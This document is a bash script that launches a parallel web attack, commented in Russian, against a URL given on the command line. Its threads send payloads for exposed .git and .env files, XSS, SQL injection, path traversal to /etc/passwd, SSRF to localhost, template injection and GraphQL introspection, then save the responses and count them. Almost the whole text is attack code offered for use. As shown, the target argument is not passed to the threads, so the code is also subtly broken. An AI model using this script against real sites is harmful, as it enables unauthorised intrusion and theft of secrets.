#!/bin/bash
TARGET=$1
THREADS=${2:-10}
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com [threads]" && exit 1

DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
echo "[PARALLEL] Запускаю атаку в $THREADS потоков..."

# Функция для одного потока
attack_thread() {
    local id=$1
    local target=$2
    local dir="$HOME/.shadow_parallel/thread_$id"
    mkdir -p "$dir"
    
    echo "[Thread-$id] Начинаю..."
    
    # Каждый поток делает свой тип атаки
    case $((id % 8)) in
        0) curl -sk --max-time 10 "$target/.git/HEAD" -o "$dir/git.txt" 2>/dev/null ;;
        1) curl -sk --max-time 10 "$target/.env" -o "$dir/env.txt" 2>/dev/null ;;
        2) curl -sk --max-time 10 "$target?q=<script>alert(1)</script>" -o "$dir/xss.txt" 2>/dev/null ;;
        3) curl -sk --max-time 10 "$target?id=1' OR '1'='1" -o "$dir/sqli.txt" 2>/dev/null ;;
        4) curl -sk --max-time 10 "$target?file=../../etc/passwd" -o "$dir/lfi.txt" 2>/dev/null ;;
        5) curl -sk --max-time 10 "$target?url=http://127.0.0.1:22" -o "$dir/ssrf.txt" 2>/dev/null ;;
        6) curl -sk --max-time 10 "$target?q={{7*7}}" -o "$dir/ssti.txt" 2>/dev/null ;;
        7) curl -sk --max-time 10 \
            -X POST -H "Content-Type: application/json" \
            -d '{"query":"{__schema{types{name}}}"}' \
            "$target/graphql" -o "$dir/graphql.txt" 2>/dev/null ;;
    esac
    
    echo "[Thread-$id] Готово"
}

export -f attack_thread
export TARGET

# Запускаем параллельно
seq 1 "$THREADS" | xargs -P "$THREADS" -I {} bash -c 'attack_thread "$@"' _ {}

# Собираем результаты
echo "[PARALLEL] Сбор результатов..."
FOUND=0
for dir in ~/.shadow_parallel/thread_*; do
    for f in "$dir"/*.txt; do
        [ -f "$f" ] && [ -s "$f" ] && FOUND=$((FOUND + 1))
    done
done

echo "[PARALLEL] Найдено: $FOUND"
echo "[PARALLEL] Все $THREADS потоков отработали одновременно"
